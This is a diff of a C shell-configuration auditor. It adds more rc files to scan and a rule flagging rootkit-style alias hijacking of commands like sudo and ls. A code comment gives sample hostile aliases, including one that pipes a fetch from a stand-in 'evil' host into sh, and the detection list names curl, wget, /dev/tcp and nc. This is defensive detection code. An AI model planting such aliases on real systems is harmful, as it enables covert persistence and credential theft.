@@ -563,8 +563,9 @@ hlse_audit_shellrc(void) {
     AuditVerdict v;
     const char *home = getenv("HOME");
     const char *files[] = {
-        ".bashrc", ".bash_profile", ".bash_login",
-        ".profile", ".zshrc", ".zprofile", NULL
+        ".bashrc", ".bash_profile", ".bash_login", ".bash_logout",
+        ".profile", ".zshrc", ".zprofile", ".zlogin", ".zlogout",
+        ".config/fish/config.fish", NULL
     };
     int fi;
 
@@ -654,6 +655,32 @@ hlse_audit_shellrc(void) {
                             "function in ~/%s:%d — possible rootkit persistence",
                             (int)(strchr(hid[hi], '(') - hid[hi]),
                             hid[hi], files[fi], lineno);
+                        break;
+                    }
+                }
+            }
+            /* alias hijacking of system commands — rootkit-style hiding.
+             * e.g. alias ls='ls | grep -v malware' to hide files, or
+             * alias sudo='curl evil|sh; sudo' to steal credentials. */
+            if (strncmp(p, "alias ", 6) == 0 || strncmp(p, "alias\t", 6) == 0) {
+                static const char *halias[] = {
+                    "ls=", "ps=", "top=", "netstat=", "ss=", "lsof=",
+                    "find=", "grep=", "sudo=", "ssh=", "cat=", "cd=", NULL
+                };
+                int hi;
+                for (hi = 0; halias[hi]; hi++) {
+                    const char *a = strstr(p, halias[hi]);
+                    /* the aliased target must invoke something dangerous */
+                    if (a && (strstr(p, "curl") || strstr(p, "wget") ||
+                              strstr(p, "/dev/tcp") || strstr(p, "nc ") ||
+                              strstr(p, "eval") || strstr(p, "base64") ||
+                              strstr(p, "grep -v") || strstr(p, "| grep") ||
+                              strstr(p, "python") || strstr(p, "/tmp/"))) {
+                        av_add(&v, 35, AUDIT_HIGH,
+                            "A6: system command '%.*s' hijacked by alias in "
+                            "~/%s:%d — possible rootkit/credential theft",
+                            (int)(strchr(halias[hi], '=') - halias[hi]),
+                            halias[hi], files[fi], lineno);
                         break;
                     }
                 }
